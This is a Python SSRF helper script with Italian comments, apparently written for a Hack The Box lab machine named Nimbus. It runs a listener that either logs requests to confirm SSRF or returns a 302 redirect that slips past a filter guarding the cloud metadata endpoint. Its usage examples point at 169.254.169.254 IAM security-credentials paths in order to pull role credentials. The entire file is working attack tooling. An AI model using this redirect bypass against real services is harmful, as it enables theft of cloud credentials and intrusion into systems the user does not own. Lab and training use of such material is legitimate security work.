#!/usr/bin/env python3
"""
SSRF helper per Nimbus HTB.

Due modalità:
  1) SPECCHIO (default, nessun argomento):
       Logga OGNI richiesta in arrivo (path, metodo, User-Agent, tutti gli header)
       e risponde 200 con uno YAML benigno. Serve a CONFERMARE l'SSRF (Step 1)
       e a capire chi/cosa fa la fetch (User-Agent) e se segue i redirect.

  2) REDIRECT (passi un URL come argomento):
       Logga la richiesta e risponde 302 verso il TARGET indicato.
       Serve a bypassare il filtro metadata (Step 3/4): il filtro controlla
       l'URL iniziale (la TUA macchina, pulito), poi il server segue il 302.

Esempi:
  python3 ssrf.py
  python3 ssrf.py "http://169.254.169.254/latest/meta-data/"
  python3 ssrf.py "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  python3 ssrf.py --port 8000 "http://169.254.169.254/latest/meta-data/iam/security-credentials/nimbus-role"
"""
import sys
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer

BENIGN_YAML = b"name: nightly-db-backup\nschedule: \"0 2 * * *\"\nruntime: python3.11\n"


def build_handler(target):
    class H(BaseHTTPRequestHandler):
        def _log_request(self):
            print("\n" + "=" * 60)
            print(f"[+] {self.command} {self.path}  da {self.client_address[0]}")
            ua = self.headers.get("User-Agent", "(nessuno)")
            print(f"    User-Agent: {ua}")
            print("    --- header completi ---")
            for k, v in self.headers.items():
                print(f"    {k}: {v}")
            print("=" * 60)

        def _respond(self):
            self._log_request()
            if target:
                # Modalità REDIRECT: 302 verso il metadata (bypass filtro)
                print(f"[>] 302 -> {target}")
                self.send_response(302)
                self.send_header("Location", target)
                self.end_headers()
            else:
                # Modalità SPECCHIO: 200 + YAML benigno (conferma SSRF)
                self.send_response(200)
                self.send_header("Content-Type", "text/yaml")
                self.send_header("Content-Length", str(len(BENIGN_YAML)))
                self.end_headers()
                self.wfile.write(BENIGN_YAML)

        do_GET = _respond
        do_POST = _respond
        do_HEAD = _respond

        def log_message(self, *a):
            pass  # silenzia il log di default; usiamo il nostro

    return H


def main():
    p = argparse.ArgumentParser()
    p.add_argument("target", nargs="?", default=None,
                   help="URL di destinazione per il 302 (se omesso: modalita' specchio)")
    p.add_argument("--port", type=int, default=8000)
    p.add_argument("--host", default="0.0.0.0")
    args = p.parse_args()

    mode = f"REDIRECT -> {args.target}" if args.target else "SPECCHIO (200 + yaml)"
    print(f"[*] In ascolto su {args.host}:{args.port}  |  modalita': {mode}")
    print(f"[*] Nel form usa: http://10.10.16.X:{args.port}/backup.yaml")
    HTTPServer((args.host, args.port), build_handler(args.target)).serve_forever()


if __name__ == "__main__":
    main()
